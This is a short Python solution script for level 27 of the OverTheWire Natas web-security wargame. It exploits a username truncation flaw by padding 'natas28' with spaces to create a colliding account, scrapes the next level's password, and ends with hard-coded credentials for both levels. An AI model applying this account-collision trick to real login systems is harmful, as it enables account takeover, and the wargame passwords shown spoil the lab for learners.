from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)

def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())

lvl_name = 'natas27'
url = f'http://{lvl_name}.natas.labs.overthewire.org'

lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3')
my_cookies = {}
username = 'natas28' + ' '*57
my_params = {'username':f'{username}X','password':'my_password'}
make()
my_params['username'] = username

res, soup = make()
print(re.search(r"[a-zA-Z0-9]{32}$", soup.find("div",id="content").text, re.MULTILINE)[0])

writeResponse()

'''

Username: natas28
Password: skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4
'''
